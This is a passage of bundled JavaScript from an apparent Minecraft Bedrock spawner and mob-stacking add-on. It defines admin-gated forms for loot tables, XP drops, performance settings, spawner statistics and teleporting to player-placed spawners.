    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    return;
  }
  const currentCap = configDatabase2.read("itemSpillCap") || 5;
  const currentXpCap = configDatabase2.read("xpSpillCap") || 3;
  const playerKillOnly = configDatabase2.read("playerKillOnly") ?? false;
  new ModalFormData2().title("Loot Drop Rules").toggle("Player Kills Only (Lag Protection)", { defaultValue: playerKillOnly }).textField("Max item drops near stack:", "Enter integer (>=1)", { defaultValue: `${currentCap}` }).textField("Max XP orbs near stack:", "Enter integer (>=1)", { defaultValue: `${currentXpCap}` }).show(player).then((r) => {
    if (r.canceled || !r.formValues)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    configDatabase2.write("playerKillOnly", r.formValues[0]);
    const capInput = parseInt(r.formValues[1]);
    if (!isNaN(capInput) && capInput >= 1)
      configDatabase2.write("itemSpillCap", capInput);
    const xpCapInput = parseInt(r.formValues[2]);
    if (!isNaN(xpCapInput) && xpCapInput >= 1)
      configDatabase2.write("xpSpillCap", xpCapInput);
    player.sendMessage(`\xA7aLoot drop rules updated!`);
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openPerformanceConfigForm(player) {
  if (!player || !player.isValid)
    return;
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    return;
  }
  const currentActivationRadius = configDatabase2.read("performanceActivationRadius") || 50;
  const currentMaxSpawns = configDatabase2.read("performanceMaxSpawns") || 25;
  const currentRandomDelay = configDatabase2.read("performanceRandomDelay") ?? true;
  const currentSpawnInterval = configDatabase2.read("performanceSpawnInterval") || 20;
  const form = new ModalFormData2().title("Performance Settings").slider(
    "\xA7bPlayer Activation Radius (blocks):\xA7r\n\xA77Distance players must be within to activate spawners.\n\xA77Lower = Better performance (spawners pause sooner)\n\xA7eDefault: 50 blocks\xA7r",
    10,
    128,
    2,
    currentActivationRadius
  ).slider(
    "\xA7bMax Spawns Per Cycle:\xA7r\n\xA77Maximum entities that can spawn per second.\n\xA77Lower = Smoother performance, slower spawning\n\xA7eDefault: 25 spawns/second\xA7r",
    5,
    100,
    5,
    currentMaxSpawns
  ).toggle(
    "\xA7bRandom Initial Spawn Delays:\xA7r\n\xA77Randomizes first spawn time (0-100%%% of interval).\n\xA77Prevents all spawners from syncing up.\n\xA7aRecommended: Enabled\xA7r",
    { defaultValue: currentRandomDelay }
  ).slider(
    "\xA7bSpawn Check Interval (ticks):\xA7r\n\xA77How often to check spawners (20 ticks = 1 second).\n\xA77Lower = More responsive, higher CPU usage\n\xA7eDefault: 20 ticks\xA7r",
    10,
    100,
    5,
    currentSpawnInterval
  );
  form.show(player).then((r) => {
    if (r.canceled || !r.formValues)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const parseOrPreserve = (raw, saved) => {
      if (typeof raw === "number")
        return raw;
      const s = String(raw).trim();
      if (s === "")
        return saved;
      const n = parseInt(s);
      return isNaN(n) ? saved : n;
    };
    const activationRadius = parseOrPreserve(r.formValues[0], currentActivationRadius);
    const maxSpawns = parseOrPreserve(r.formValues[1], currentMaxSpawns);
    const randomDelay = r.formValues[2];
    const spawnInterval = parseOrPreserve(r.formValues[3], currentSpawnInterval);
    let updated = false;
    let warnings = [];
    if (activationRadius >= 10 && activationRadius <= 128) {
      configDatabase2.write("performanceActivationRadius", activationRadius);
      updated = true;
    } else {
      warnings.push("\xA7eInvalid activation radius - must be between 10-128 blocks");
    }
    if (maxSpawns >= 5 && maxSpawns <= 100) {
      configDatabase2.write("performanceMaxSpawns", maxSpawns);
      updated = true;
    } else {
      warnings.push("\xA7eInvalid max spawns - must be between 5-100");
    }
    configDatabase2.write("performanceRandomDelay", randomDelay);
    updated = true;
    if (spawnInterval >= 10 && spawnInterval <= 100) {
      configDatabase2.write("performanceSpawnInterval", spawnInterval);
      if (spawnInterval < 20) {
        warnings.push("\xA7c\u26A0 Low spawn interval may increase CPU usage!");
      }
      updated = true;
    } else {
      warnings.push("\xA7eInvalid spawn interval - must be between 10-100 ticks");
    }
    if (updated) {
      player.sendMessage("\xA7a\u2713 Performance settings saved to database!");
      player.sendMessage("\xA7c\xA7l\u26A0 REQUIRES SERVER RESTART OR WORLD RESTART \u26A0");
      player.sendMessage("\xA7c(Settings are cached at startup for maximum performance)");
      player.sendMessage("\xA7e");
      player.sendMessage("\xA7e\xBB Use \xA7f/reload \xA7eor restart world to apply changes");
    }
    warnings.forEach((warning) => player.sendMessage(warning));
    if (warnings.length === 0 && updated) {
      player.sendMessage("\xA77\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501");
      player.sendMessage("\xA7bSettings Saved (Pending Restart):\xA7r");
      player.sendMessage(`\xA77Activation Radius: \xA7e${activationRadius} blocks`);
      player.sendMessage(`\xA77Max Spawns: \xA7e${maxSpawns}/second`);
      player.sendMessage(`\xA77Random Delays: \xA7e${randomDelay ? "Enabled" : "Disabled"}`);
      player.sendMessage(`\xA77Check Interval: \xA7e${spawnInterval} ticks`);
      player.sendMessage("\xA77\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501");
      player.sendMessage("\xA7c\xA7l\xBB RESTART REQUIRED TO ACTIVATE \xAB");
    }
  }).catch((error) => {
    console.error(`Error in openPerformanceConfigForm: ${error}`);
    player.sendMessage("\xA7cAn error occurred while updating performance settings.");
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openRadiusConfigForm(player) {
  if (!player || !player.isValid) {
    console.error("Invalid player provided to openRadiusConfigForm");
    return;
  }
  const radius = configDatabase2.read("stackRadius") || 50;
  new ModalFormData2().title("Configure Stack Radius").slider("Stacking Radius (blocks):", 1, 100, 1, radius).show(player).then((r) => {
    if (r.canceled || !r.formValues)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      securityService.logSecurityEvent("unauthorized_config_change", player, {
        configType: "radius"
      });
      return;
    }
    const newRadius = typeof r.formValues[0] === "number" ? r.formValues[0] : parseInt(r.formValues[0]);
    if (!isNaN(newRadius) && newRadius > 0 && newRadius <= 100) {
      configDatabase2.write("stackRadius", newRadius);
      player.sendMessage(`\xA7aStacking radius updated to ${newRadius}!`);
      securityService.logSecurityEvent("config_updated", player, {
        configType: "stackRadius",
        oldValue: UI.DEFAULT_STACK_RADIUS,
        newValue: newRadius
      });
    } else {
      player.sendMessage(ERROR_MESSAGES.INVALID_RADIUS);
      securityService.logSecurityEvent("invalid_config_value", player, {
        configType: "stackRadius",
        attemptedValue: r.formValues[0]
      });
    }
  }).catch((error) => {
    console.error(`Error in openRadiusConfigForm: ${error}`);
    player.sendMessage("\xA7cAn error occurred while updating the configuration.");
    performanceMonitor.recordError("radius_config_error", error instanceof Error ? error.message : String(error));
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openLootTableConfigForm(player) {
  if (!player || !player.isValid)
    return;
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    return;
  }
  const form = new ActionFormData2().title("Loot Table Configuration").body("Select an entity to configure its loot table:");
  const sortedMobs = [...validMobs].sort((a, b) => a.displayName.localeCompare(b.displayName));
  sortedMobs.forEach((mob) => {
    const iconPath = getSpawnerIconPath(mob.typeId, mob.displayName);
    form.button(`Spawner ${mob.displayName}`, iconPath);
  });
  form.show(player).then((r) => {
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    if (!r.canceled && r.selection !== void 0)
      openEntityLootConfigForm(player, sortedMobs[r.selection].typeId);
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openEntityLootConfigForm(player, entityId) {
  if (!player || !player.isValid)
    return;
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    return;
  }
  const lootManager = lootManagerInstance;
  const table = lootManager.entities[entityId] || {};
  const form = new ActionFormData2().title(entityId).body("Select an action:");
  Object.keys(table).forEach((itemId) => form.button(`Edit ${itemId}`));
  form.button("Add New Item", "textures/ui/plus.png");
  form.button("XP Manager", "textures/items/experience_bottle.png");
  form.show(player).then((r) => {
    if (r.canceled || r.selection === void 0)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const itemCount = Object.keys(table).length;
    if (r.selection < itemCount)
      openEditLootItemForm(player, entityId, Object.keys(table)[r.selection]);
    else if (r.selection === itemCount)
      openAddNewLootItemForm(player, entityId);
    else if (r.selection === itemCount + 1)
      openXPDropManagerForm(player, entityId);
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openXPDropManagerForm(player, entityId) {
  if (!player || !player.isValid)
    return;
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    return;
  }
  const config = xpDropDatabase.read(entityId) || {};
  new ModalFormData2().title(`XP Manager: ${entityId}`).textField("XP Amount:", "XP to drop on death", { defaultValue: `${config.amount ?? 1}` }).slider("Drop Chance (%%%)", 1, 100, 1, config.chance ?? 100).show(player).then((r) => {
    if (r.canceled || !r.formValues)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const amount = parseInt(r.formValues[0]);
    const chance = r.formValues[1];
    if (!isNaN(amount) && amount >= 0) {
      xpDropDatabase.write(entityId, { amount, chance });
      player.sendMessage(`\xA7aXP drop updated for ${entityId}.`);
    } else
      player.sendMessage("\xA7cInvalid amount.");
    openEntityLootConfigForm(player, entityId);
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openAddNewLootItemForm(player, entityId) {
  if (!player || !player.isValid)
    return;
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    return;
  }
  const lootManager = lootManagerInstance;
  const categories = ["None", ...Object.keys(lootManager.enchantmentCategories)];
  new ModalFormData2().title(`Add Loot: ${entityId}`).textField("Item ID:", "e.g., minecraft:diamond", { defaultValue: "" }).textField("Chance:", "[0.01-100]", { defaultValue: "100" }).toggle("Enchantable?", { defaultValue: false }).dropdown("Enchantment Category:", categories, 0).textField("Enchant Chance:", "[0-100]", { defaultValue: "50" }).toggle("Stackable?", { defaultValue: true }).toggle("Random Durability?", { defaultValue: false }).show(player).then((r) => {
    if (r.canceled || !r.formValues)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const [id, chance, ench, catIdx, enchChance, stack, dura] = r.formValues;
    const pChance = parseFloat(chance);
    if (!id || isNaN(pChance)) {
      player.sendMessage("\xA7cInvalid Item ID or Chance.");
      return;
    }
    if (!lootManager.entities[entityId])
      lootManager.entities[entityId] = {};
    lootManager.entities[entityId][id] = {
      chance: pChance,
      enchantments: ench && categories[catIdx] !== "None" ? { chance: parseFloat(enchChance), category: categories[catIdx] } : void 0,
      stackable: stack,
      randomdurability: dura
    };
    lootManager.saveLootTable(entityId);
    player.sendMessage(`\xA7aAdded ${id} to ${entityId}'s loot table.`);
    openEntityLootConfigForm(player, entityId);
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openEditLootItemForm(player, entityId, itemId) {
  if (!player || !player.isValid)
    return;
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    return;
  }
  const lootManager = lootManagerInstance;
  const config = lootManager.entities[entityId][itemId];
  const categories = ["None", ...Object.keys(lootManager.enchantmentCategories)];
  const catIdx = config.enchantments ? categories.indexOf(config.enchantments.category) : 0;
  new ModalFormData2().title(`Editing: ${itemId}`).textField("Chance:", "[0.01-100]", { defaultValue: `${config.chance}` }).toggle("Enchantable?", { defaultValue: !!config.enchantments }).dropdown("Category:", categories, Math.max(0, catIdx)).textField("Enchant Chance:", "[0-100]", { defaultValue: `${config.enchantments?.chance ?? 50}` }).toggle("Stackable?", { defaultValue: config.stackable !== false }).toggle("Random Durability?", { defaultValue: config.randomdurability === true }).toggle("\xA7cDELETE THIS ITEM?\xA7r", { defaultValue: false }).show(player).then((r) => {
    if (r.canceled || !r.formValues)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const [chance, ench, catIdxSelected, enchChance, stack, dura, del] = r.formValues;
    if (del)
      delete lootManager.entities[entityId][itemId];
    else {
      const pChance = parseFloat(chance);
      if (isNaN(pChance)) {
        player.sendMessage("\xA7cInvalid Chance.");
        return;
      }
      config.chance = pChance;
      config.enchantments = ench && categories[catIdxSelected] !== "None" ? { chance: parseFloat(enchChance), category: categories[catIdxSelected] } : void 0;
      config.stackable = stack;
      config.randomdurability = dura;
    }
    lootManager.saveLootTable(entityId);
    player.sendMessage(`\xA7aLoot table for ${entityId} updated.`);
    openEntityLootConfigForm(player, entityId);
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openAAConfigForm(player) {
  if (!player || !player.isValid) {
    console.error(ERROR_MESSAGES.INVALID_PLAYER);
    return;
  }
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    securityService.logSecurityEvent("unauthorized_aa_config", player);
    return;
  }
  const form = new ModalFormData2().title("Spawner Settings");
  const entries = [];
  aaDatabase.forEach((val, key) => entries.push([key, val]));
  form.textField("Add New Range:", "e.g., 1-10 or 33-33", { defaultValue: "" });
  form.textField("New Range - Quantity:", "e.g., 1", { defaultValue: "" });
  form.textField("New Range - Speed (sec):", "e.g., 10", { defaultValue: "" });
  form.textField("New Range - Max Stack:", "e.g., 100", { defaultValue: "" });
  entries.forEach(([range, { qty, speed, maxStack }]) => {
    form.textField(`Qty for ${range}:`, `Update`, { defaultValue: `${qty}` });
    form.textField(`Speed for ${range}:`, `Update`, { defaultValue: `${speed}` });
    form.textField(`Max Stack for ${range}:`, `Update`, { defaultValue: `${maxStack}` });
    form.toggle(`\xA7cRemove Range ${range}?\xA7r`, { defaultValue: false });
  });
  form.show(player).then((r) => {
    if (r.canceled || !r.formValues)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const vals = r.formValues;
    if (typeof vals[0] === "string" && vals[0].trim()) {
      let range = vals[0].trim();
      if (!range.includes("-"))
        range = `${range}-${range}`;
      const parseOrDefault = (raw, fallback) => {
        const s = String(raw).trim();
        if (s === "")
          return fallback;
        const n = parseInt(s);
        return isNaN(n) ? fallback : n;
      };
      aaDatabase.write(range, {
        qty: Math.max(1, parseOrDefault(vals[1], 1)),
        speed: Math.min(MAX_ALLOWED_SPEED, Math.max(1, parseOrDefault(vals[2], 10))),
        maxStack: Math.min(MAX_ALLOWED_STACK, Math.max(1, parseOrDefault(vals[3], 100)))
      });
    }
    let offset = 4;
    entries.forEach(([range, currentVal]) => {
      if (vals[offset + 3]) {
        aaDatabase.delete(range);
      } else {
        const savedQty = currentVal?.qty ?? 1;
        const savedSpeed = currentVal?.speed ?? 10;
        const savedMaxStack = currentVal?.maxStack ?? 100;
        const parseOrPreserve = (raw, saved) => {
          const s = String(raw).trim();
          if (s === "")
            return saved;
          const n = parseInt(s);
          return isNaN(n) ? saved : n;
        };
        aaDatabase.write(range, {
          qty: Math.max(1, parseOrPreserve(vals[offset], savedQty)),
          speed: Math.min(MAX_ALLOWED_SPEED, Math.max(1, parseOrPreserve(vals[offset + 1], savedSpeed))),
          maxStack: Math.min(MAX_ALLOWED_STACK, Math.max(1, parseOrPreserve(vals[offset + 2], savedMaxStack)))
        });
      }
      offset += 4;
    });
    rebuildAALookup();
    clearSpawnerParseCache();
    player.sendMessage("\xA7aSpawner settings updated!");
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function toggleLogging(player) {
  try {
    if (!player || !player.isValid) {
      console.error("Invalid player provided to toggleLogging");
      return;
    }
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    if (isLoggingEnabled()) {
      disableLogging();
      player.sendMessage("\xA7cLogging has been disabled for all spawner activities.");
    } else {
      enableLogging();
      player.sendMessage("\xA7aLogging has been enabled for all spawner activities.");
    }
    system3.run(() => openAdminMenu(player));
  } catch (error) {
    console.error(`Error in toggleLogging: ${error}`);
    player.sendMessage("\xA7cAn error occurred while toggling logging.");
  }
}
function openSpawnerStatisticsForm(player) {
  try {
    if (!player || !player.isValid) {
      console.error("Invalid player provided to openSpawnerStatisticsForm");
      return;
    }
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    debugLog2("[MOBSTACKER] Loading database stats to merge with local data");
    loadSpawnerStatistics();
    debugLog2(`Stats available: ${spawnerStatistics.entitiesKilled.size} entities, ${spawnerStatistics.playerStats.size} players`);
    calculateSpawnerTotals();
    const totalKills = Array.from(spawnerStatistics.entitiesKilled.values()).reduce((sum, kills) => sum + kills, 0);
    const onlinePlayersCount = world4.getAllPlayers().length;
    const uniquePlayersCount = spawnerStatistics.playerStats.size;
    const totalKillsFormatted = totalKills.toLocaleString();
    const uptimeMinutes = Math.floor((Date.now() - (performanceMetrics.lastReset || Date.now())) / 1e3 / 60);
    const uptimeHours = Math.floor(uptimeMinutes / 60);
    const uptimeDisplay = uptimeHours > 0 ? `${uptimeHours}h ${uptimeMinutes % 60}m` : `${uptimeMinutes}m`;
    const serverLoad = spawnerStatistics.totalSpawners > 0 ? Math.min(100, Math.max(0, spawnerStatistics.totalEntities / spawnerStatistics.totalSpawners * 25)).toFixed(1) : "0";
    const minecraftTickTime = 50;
    const tickEfficiency = performanceMetrics.averageProcessingTime > 0 ? Math.min(100, performanceMetrics.averageProcessingTime / minecraftTickTime * 100).toFixed(1) : "0";
    const memoryUsage = getMemoryUsage();
    let memoryLevel;
    if (memoryUsage < 50) {
      memoryLevel = "Low";
    } else if (memoryUsage < 150) {
      memoryLevel = "Medium";
    } else if (memoryUsage < 300) {
      memoryLevel = "High";
    } else {
      memoryLevel = "Very High";
    }
    const topMobs = Array.from(spawnerStatistics.entitiesKilled.entries()).sort((a, b) => b[1] - a[1]).slice(0, 10);
    const topPlayers = Array.from(spawnerStatistics.playerStats.entries()).sort((a, b) => (b[1].entitiesKilled || 0) - (a[1].entitiesKilled || 0)).slice(0, 10);
    const totalSpawnersPlaced = spawnerDatabase.length;
    const loadedSpawnersCount = spawnerStatistics.totalSpawners;
    let bodyText = `\xA76\xA7lSERVER STATISTICS\xA7r

`;
    bodyText += `\xA7bSpawner Blocks Placed (Total): \xA7f${totalSpawnersPlaced.toLocaleString()}
`;
    bodyText += `\xA7bLoaded/Ticking Spawners: \xA7f${loadedSpawnersCount.toLocaleString()}
`;
    bodyText += `\xA7bLoaded Mob Stacks (Physical): \xA7f${spawnerStatistics.totalEntities.toLocaleString()}
`;
    bodyText += `\xA7bLoaded Mobs (Total inside Stacks): \xA7f${spawnerStatistics.totalVirtualEntities.toLocaleString()}
`;
    bodyText += `\xA7bOnline Players: \xA7f${onlinePlayersCount}
`;
    bodyText += `\xA7bPlayers with Kill History: \xA7f${uniquePlayersCount}
`;
    bodyText += `\xA7bActive Spawner Chunks: \xA7f${ACTIVE_CHUNKS.size}
`;
    bodyText += `\xA7bServer Load (Entity Density): \xA7f${serverLoad}% \xA77(Target < 4 mobs/spawner)
`;
    bodyText += `\xA7bServer Uptime: \xA7f${uptimeDisplay}
`;
    bodyText += `\xA7bMemory Usage (Internal Units): \xA7f${memoryLevel} (${memoryUsage.toLocaleString()} / 200 warning)
`;
    bodyText += `\xA7bTick Usage (CPU load): \xA7f${tickEfficiency}% (${performanceMetrics.averageProcessingTime.toFixed(2)}ms of 50ms tick)
`;
    bodyText += `\xA7bTotal Kills: \xA7f${totalKillsFormatted}

`;
    bodyText += `\xA76\xA7lTOP 10 MOST KILLED MOBS\xA7r
`;
    if (topMobs.length > 0) {
      topMobs.forEach((mob, index) => {
        const mobName = getMobDisplayName(mob[0]) || "Unknown";
        const rank = index + 1;
        bodyText += `\xA77${rank}. \xA7f${mobName} \xA77(${mob[1].toLocaleString()} kills)
`;
      });
    } else {
      bodyText += `\xA77No kills recorded yet
`;
    }
    bodyText += `
`;
    bodyText += `\xA76\xA7lTOP 10 KILLERS\xA7r
`;
    if (topPlayers.length > 0) {
      topPlayers.forEach((playerEntry, index) => {
        const rank = index + 1;
        const totalKillsCount = playerEntry[1].entitiesKilled?.toLocaleString() || 0;
        bodyText += `\xA77${rank}. \xA7f${playerEntry[0]} \xA77(${totalKillsCount} total kills)
`;
        const playerTopKills = getPlayerTopKills(playerEntry[1], 3);
        playerTopKills.forEach((killType) => {
          bodyText += `   \xA78- \xA77${killType.displayName}: ${killType.count.toLocaleString()}
`;
        });
        bodyText += `
`;
      });
    } else {
      bodyText += `\xA77No player kills recorded yet
`;
    }
    const form = new ActionFormData2().title("\xA78Spawner Server Statistics").body(bodyText).button("\xA78Close", "textures/ui/cancel").button("\xA7bView Player Stats", "textures/items/name_tag").button("\xA7cReset All Statistics", "textures/ui/realms_red_x");
    form.show(player).then((response) => {
      if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
        player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
        return;
      }
      if (response.canceled || response.selection === 0)
        return;
      if (response.selection === 1) {
        openPlayerStatsSelectionForm(player);
        return;
      }
      if (response.selection === 2) {
        const confirmForm = new ModalFormData2().title("Confirm Reset").textField("Confirm", "Type 'RESET' to confirm", { defaultValue: "" }).submitButton("CONFIRM");
        confirmForm.show(player).then((confirmResponse) => {
          if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
            player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
            return;
          }
          if (confirmResponse.canceled || !confirmResponse.formValues)
            return;
          const confirmationText = confirmResponse.formValues[0]?.toUpperCase().trim();
          if (confirmationText === "RESET") {
            resetSpawnerStatistics();
            player.sendMessage("\xA7a\u2713 All statistics have been reset successfully!");
          } else {
            player.sendMessage("\xA7cReset cancelled - confirmation code was incorrect.");
          }
        }).catch((error) => {
          console.error(`Error in spawner stats reset confirmation: ${error}`);
        });
      }
    }).catch((error) => {
      console.error(`Error in openSpawnerStatisticsForm: ${error}`);
      player.sendMessage("\xA7cAn error occurred while showing statistics.");
    });
  } catch (error) {
    console.error(`Critical error in openSpawnerStatisticsForm: ${error}`);
    player.sendMessage("\xA7cA critical error occurred. Please try again.");
  }
}
function openSpawnerTeleportForm(player) {
  try {
    if (!player || !player.isValid) {
      console.error("Invalid player provided to openSpawnerTeleportForm");
      return;
    }
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const playerSpawners = /* @__PURE__ */ new Map();
    const allSpawners = {};
    const allSpawnerKeys = spawnerDatabase.keys();
    for (const key of allSpawnerKeys) {
      const spawnerData = spawnerDatabase.read(key);
      if (spawnerData && spawnerData.placedBy) {
        const playerName = spawnerData.placedBy;
        if (!playerSpawners.has(playerName)) {
          playerSpawners.set(playerName, []);
        }
        const details = {
          location: key,
          typeId: spawnerData.typeId,
          placedAt: spawnerData.placedAt
        };
        playerSpawners.get(playerName).push(details);
        allSpawners[key] = spawnerData;
      }
    }
    if (playerSpawners.size === 0) {
      player.sendMessage("\xA7cNo active spawners found in the database.");
      return;
    }
    const totalSpawners = Array.from(playerSpawners.values()).reduce((sum, spawners) => sum + spawners.length, 0);
    const sortedPlayers = Array.from(playerSpawners.entries()).sort((a, b) => b[1].length - a[1].length);
    const form = new ActionFormData2().title("Spawner Teleport System").body(`Database size: ${totalSpawners} spawners across ${playerSpawners.size} players. Select a player to view their spawners:`);
    form.button("\u{1F50D} Search by Location", "textures/ui/magnifying_glass");
    sortedPlayers.forEach(([playerName, spawners]) => {
      form.button(`\u{1F464} ${playerName} (${spawners.length} spawners)`, "textures/items/name_tag");
    });
    form.show(player).then((r) => {
      if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
        player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
        return;
      }
      if (r.canceled || r.selection === void 0)
        return;
      if (r.selection === 0) {
        openLocationSearchForm(player, allSpawners);
        return;
      }
      const selectedPlayerData = sortedPlayers[r.selection - 1];
      if (selectedPlayerData) {
        const [selectedPlayer, spawners] = selectedPlayerData;
        openSpawnerSelectionForm(player, selectedPlayer, spawners);
      }
    }).catch((error) => {
      console.error(`Error in openSpawnerTeleportForm: ${error}`);
      player.sendMessage("\xA7cAn error occurred while showing the spawner teleport form.");
    });
  } catch (error) {
    console.error(`Critical error in openSpawnerTeleportForm: ${error}`);
    player.sendMessage("\xA7cA critical error occurred. Please try again.");
  }
}
function openSpawnerSelectionForm(player, playerName, spawners) {
  try {
    if (!player || !player.isValid)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const validSpawners = spawners.filter((spawner) => spawner !== void 0 && spawner !== null);
    const spawnerDetails = validSpawners.map((spawner) => {
      let x = 0, y = 0, z = 0;
      try {
        if (spawner.location && typeof spawner.location === "string") {
          const coords = spawner.location.split(",").map((coord) => parseFloat(coord.trim()));
          if (coords.length >= 3 && coords.every((coord) => !isNaN(coord))) {
            [x, y, z] = coords;
          }
        }
      } catch (error) {
        debugLog2(`Error parsing location for spawner: ${spawner.location}, error: ${error}`);
      }
      const typeId = spawner.typeId || "unknown_spawner";
      const levelMatch = typeId.match(/spawner(\d+)/);
      const level = levelMatch ? parseInt(levelMatch[1]) : 1;
      const mobType = typeId.replace("mrleefy:", "").replace(/spawner\d+/, "").replace(/_/g, "");
      const displayName = getMobDisplayName(`mrleefy:${mobType}still`) || "Unknown";
      const info = getEntitiesInfoNearSpawner(x, y, z);
      return {
        ...spawner,
        displayName,
        level,
        physicalEntities: info.physicalCount,
        virtualEntities: info.virtualCount,
        x,
        y,
        z
      };
    });
    const totalPhysical = spawnerDetails.reduce((sum, s) => sum + (s.physicalEntities || 0), 0);
    const totalVirtual = spawnerDetails.reduce((sum, s) => sum + (s.virtualEntities || 0), 0);
    const avgLevel = spawnerDetails.length > 0 ? spawnerDetails.reduce((sum, s) => sum + (s.level || 1), 0) / spawnerDetails.length : 0;
    const form = new ActionFormData2().title(`${playerName}'s Spawners`).body(`Total: ${spawnerDetails.length} spawners | Active: ${totalPhysical} stacks (${totalVirtual} mobs) | Avg Level: ${avgLevel.toFixed(1)}`);
    spawnerDetails.forEach((spawner) => {
      const status = spawner.physicalEntities > 0 ? `\xA7a[Active: ${spawner.physicalEntities} stack (${spawner.virtualEntities} mobs)]` : "\xA78[Idle]";
      const iconPath = getSpawnerIconPath(spawner.typeId, spawner.displayName);
      form.button(`${status} \xA77Lvl ${spawner.level} \xA7f${spawner.displayName}
\xA78Coord: ${spawner.x}, ${spawner.y}, ${spawner.z}`, iconPath);
    });
    form.button("\xA76\u{1F4CA} View Player Statistics", "textures/ui/book_normal");
    form.show(player).then((r) => {
      if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
        player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
        return;
      }
      if (r.canceled || r.selection === void 0)
        return;
      if (r.selection === spawnerDetails.length) {
        openSpawnerInfoForm(player, playerName, spawnerDetails);
        return;
      }
      const selectedDetail = spawnerDetails[r.selection];
      if (selectedDetail) {
        teleportToSpawner(player, selectedDetail.x, selectedDetail.y, selectedDetail.z);
      }
    }).catch((error) => {
      console.error(`Error in openSpawnerSelectionForm: ${error}`);
      player.sendMessage("\xA7cAn error occurred while opening selection form.");
    });
  } catch (error) {
    console.error(`Critical error in openSpawnerSelectionForm: ${error}`);
    player.sendMessage("\xA7cA critical error occurred. Please try again.");
  }
}
function teleportToSpawner(player, x, y, z) {
  try {
    if (!player || !player.isValid)
      return;
    player.sendMessage(`\xA7aTeleporting to spawner at ${x}, ${y}, ${z}...`);
    system3.run(() => {
      try {
        const dimension = player.dimension;
        player.teleport({ x: x + 0.5, y: y + 1.5, z: z + 0.5 }, { dimension });
      } catch (teleportError) {
        console.error(`Teleport logic failed: ${teleportError}`);
        player.sendMessage(`\xA7cTeleport failed. Check if coordinate is in a loaded area or try again.`);
      }
    });
  } catch (error) {
    console.error(`Error in teleportToSpawner: ${error}`);
    player.sendMessage("\xA7cA critical error occurred during teleportation.");
  }
}
